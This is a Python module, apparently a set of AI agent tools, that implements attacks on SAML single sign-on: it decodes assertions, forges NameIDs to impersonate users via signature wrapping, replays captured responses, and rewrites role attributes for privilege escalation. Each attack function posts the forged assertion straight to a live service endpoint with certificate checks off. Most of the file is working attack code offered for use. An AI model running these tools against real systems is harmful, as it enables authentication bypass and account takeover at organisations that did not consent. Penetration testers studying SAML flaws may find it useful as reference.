"""
SAML / SSO Attack Suite
Tests SAML-based SSO implementations for:
- XML Signature Wrapping (XSW) attacks
- XML External Entity injection in SAML assertions
- SAML Response forgery (missing signature validation)
- Signature exclusion attacks
- Role/attribute manipulation in assertions
- SAML replay attacks
- IdP-initiated vs SP-initiated flow confusion
"""

import re
import base64
import zlib
import requests
from src.sdk.core import function_tool


def _decode_saml_response(encoded: str) -> str:
    """Base64-decode a SAML response."""
    try:
        return base64.b64decode(encoded).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _encode_saml(xml: str) -> str:
    """Base64-encode a SAML payload."""
    return base64.b64encode(xml.encode()).decode()


def _deflate_encode(xml: str) -> str:
    """Deflate + base64 encode (for HTTP-Redirect binding)."""
    deflated = zlib.compress(xml.encode())[2:-4]  # Raw deflate
    return base64.b64encode(deflated).decode()


@function_tool()
def saml_response_decode(saml_response: str):
    """
    Decode and inspect a SAML Response for security analysis.
    Extracts NameID, attributes, signature info, and identifies attack vectors.

    Args:
        saml_response: Base64-encoded SAML Response (from SAMLResponse param)
    """
    xml = _decode_saml_response(saml_response)
    if not xml:
        return "[ERROR] Could not decode SAML response"

    results = ["[SAML] Decoded SAML Response:"]
    results.append("=" * 60)

    # Extract NameID
    nameid_match = re.search(r'<(?:\w+:)?NameID[^>]*>([^<]+)<', xml)
    if nameid_match:
        results.append(f"[NameID] {nameid_match.group(1)}")

    # Extract attributes
    attr_matches = re.findall(r'Name="([^"]+)".*?<(?:\w+:)?AttributeValue[^>]*>([^<]+)<', xml, re.DOTALL)
    if attr_matches:
        results.append("\n[Attributes]")
        for name, value in attr_matches[:20]:
            results.append(f"  {name} = {value}")
            # Flag sensitive ones
            if any(kw in name.lower() for kw in ["role", "admin", "group", "privilege", "email"]):
                results.append(f"  ⚡ HIGH VALUE: modify '{name}' for privilege escalation")

    # Check signature
    has_signature = "<Signature" in xml or "<ds:Signature" in xml
    results.append(f"\n[Signature] Present: {has_signature}")
    if not has_signature:
        results.append("⚠️  NO SIGNATURE FOUND — Response may be forgeable!")

    # Check conditions
    not_before = re.search(r'NotBefore="([^"]+)"', xml)
    not_after = re.search(r'NotOnOrAfter="([^"]+)"', xml)
    if not_before:
        results.append(f"[Validity] NotBefore: {not_before.group(1)}")
    if not_after:
        results.append(f"[Validity] NotOnOrAfter: {not_after.group(1)}")

    # Check for InResponseTo (SP-initiated)
    in_response = re.search(r'InResponseTo="([^"]+)"', xml)
    results.append(f"[SP-Initiated] {'Yes - ' + in_response.group(1)[:30] if in_response else 'No (IdP-initiated or missing)'}")
    if not in_response:
        results.append("⚠️  Missing InResponseTo — may be vulnerable to replay attacks")

    results.append("\n[Attack Surface]")
    results.append("1. XML Signature Wrapping (XSW) — move signed elem, inject unsigned assertion")
    results.append("2. Attribute manipulation — change role/admin values")
    results.append("3. NameID manipulation — change user identity")
    if not has_signature:
        results.append("4. ⚠️  FULL FORGERY POSSIBLE — no signature to validate")

    return "\n".join(results)


@function_tool()
def saml_xsw_attack(
    saml_response: str,
    acs_url: str,
    target_nameid: str,
    headers: str = "{}"
):
    """
    XML Signature Wrapping (XSW) attack against a SAML Service Provider.
    Wraps a valid signed assertion inside a manipulated outer structure,
    changing the NameID while preserving the valid signature on the original.

    Args:
        saml_response: Original valid Base64-encoded SAMLResponse
        acs_url: Assertion Consumer Service URL (SP endpoint to POST to)
        target_nameid: Target NameID to impersonate (e.g. admin@company.com)
        headers: JSON string of session headers
    """
    import json
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}

    xml = _decode_saml_response(saml_response)
    if not xml:
        return "[ERROR] Could not decode SAML response"

    results = [f"[XSW] Attempting XML Signature Wrapping against: {acs_url}"]
    results.append(f"[XSW] Impersonating: {target_nameid}")

    # Extract original NameID
    original_nameid_match = re.search(r'(<(?:\w+:)?NameID[^>]*>)([^<]+)(<)', xml)
    if not original_nameid_match:
        results.append("[ERROR] Could not find NameID in decoded assertion")
        return "\n".join(results)

    original_nameid = original_nameid_match.group(2)
    results.append(f"[INFO] Original NameID: {original_nameid}")

    # XSW Attack Variants
    xsw_variants = []

    # XSW1: Inject unsigned response around signed
    xsw1 = xml.replace(
        original_nameid_match.group(2),
        target_nameid
    )
    xsw_variants.append(("XSW1-NameID-Replace", xsw1))

    # XSW2: Wrap with outer Response containing different NameID
    # This is a structural attack - simplified representation
    if "<samlp:Response" in xml:
        xsw2_outer = xml.replace(
            f">{original_nameid}<",
            f">{target_nameid}<"
        )
        xsw_variants.append(("XSW2-Response-Wrap", xsw2_outer))

    vulnerable_variants = []
    for variant_name, manipulated_xml in xsw_variants:
        encoded = _encode_saml(manipulated_xml)
        data = {"SAMLResponse": encoded}

        try:
            resp = requests.post(acs_url, data=data, headers=hdrs,
                                 verify=False, timeout=15, allow_redirects=True)
            status = resp.status_code
            resp_lower = resp.text.lower()

            if status in (200, 302) and any(kw in resp_lower for kw in
                ["dashboard", "welcome", "logout", "session", "account"]):
                vulnerable_variants.append(variant_name)
                results.append(f"[VULNERABLE] {variant_name}: Authenticated as {target_nameid}!")
                results.append(f"  HTTP {status} | Response: {resp.text[:150]}")
            elif status in (200, 302):
                results.append(f"[UNCERTAIN] {variant_name}: HTTP {status} — manual check needed")
            else:
                results.append(f"[BLOCKED] {variant_name}: HTTP {status}")
        except Exception as e:
            results.append(f"[ERROR] {variant_name}: {e}")

    results.append(f"\n{'='*60}")
    if vulnerable_variants:
        results.append(f"⚠️  XSW ATTACK SUCCESS: {vulnerable_variants}")
        results.append(f"Impact: Authentication bypass → account takeover as {target_nameid}")
    else:
        results.append("XSW attacks not conclusively successful — SP may validate signatures correctly")

    return "\n".join(results)


@function_tool()
def saml_replay_probe(
    saml_response: str,
    acs_url: str,
    headers: str = "{}",
    replay_count: int = 3
):
    """
    Test if a SAML Response can be replayed (missing assertion ID tracking).

    Args:
        saml_response: Valid Base64-encoded SAMLResponse
        acs_url: Assertion Consumer Service URL
        headers: JSON string of request headers
        replay_count: Number of times to replay
    """
    import json
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}

    results = [f"[SAML-REPLAY] Testing replay protection: {acs_url}"]

    success_count = 0
    for i in range(replay_count):
        data = {"SAMLResponse": saml_response}
        try:
            resp = requests.post(acs_url, data=data, headers=hdrs,
                                 verify=False, timeout=15, allow_redirects=False)
            status = resp.status_code
            location = resp.headers.get("Location", "")

            if status in (200, 302) and any(kw in (resp.text + location).lower() for kw in
                    ["dashboard", "account", "home", "welcome"]):
                success_count += 1
                results.append(f"[REPLAY {i+1}] Accepted ✓ — HTTP {status}")
            else:
                results.append(f"[REPLAY {i+1}] Rejected — HTTP {status}")
        except Exception as e:
            results.append(f"[REPLAY {i+1}] Error: {e}")

    results.append(f"\n{'='*60}")
    if success_count > 1:
        results.append(f"⚠️  SAML REPLAY: Response accepted {success_count}/{replay_count} times!")
        results.append("Impact: Stolen SAML assertion can be reused for repeated auth")
    else:
        results.append("Replay protection appears in place")

    return "\n".join(results)


@function_tool()
def saml_attr_manipulation(
    saml_response: str,
    acs_url: str,
    attribute_name: str,
    original_value: str,
    new_value: str,
    headers: str = "{}"
):
    """
    Manipulate a SAML attribute to attempt privilege escalation.
    E.g. change role=user to role=admin in an unsigned assertion.

    Args:
        saml_response: Base64-encoded SAMLResponse
        acs_url: ACS endpoint
        attribute_name: Attribute to modify (e.g. role, groups, email)
        original_value: Current value of the attribute
        new_value: Value to inject (e.g. admin, superuser, admin@corp.com)
        headers: JSON string of headers
    """
    import json
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}

    xml = _decode_saml_response(saml_response)
    if not xml:
        return "[ERROR] Could not decode"

    results = [f"[SAML-ATTR] Manipulating '{attribute_name}': '{original_value}' → '{new_value}'"]

    if original_value not in xml:
        results.append(f"[WARN] '{original_value}' not found in assertion — try saml_response_decode first")
        return "\n".join(results)

    manipulated = xml.replace(original_value, new_value)
    encoded = _encode_saml(manipulated)

    data = {"SAMLResponse": encoded}
    try:
        resp = requests.post(acs_url, data=data, headers=hdrs,
                             verify=False, timeout=15, allow_redirects=True)
        status = resp.status_code

        if status in (200, 302):
            results.append(f"[RESULT] HTTP {status} — Response accepted")
            if any(kw in resp.text.lower() for kw in ["admin", "dashboard", new_value.lower()]):
                results.append(f"⚠️  ATTRIBUTE MANIPULATION SUCCESS: '{attribute_name}' = '{new_value}' accepted!")
                results.append(f"  Response: {resp.text[:200]}")
            else:
                results.append("[UNCERTAIN] Accepted but no clear privilege escalation evidence")
        else:
            results.append(f"[BLOCKED] HTTP {status}")
    except Exception as e:
        results.append(f"[ERROR] {e}")

    return "\n".join(results)
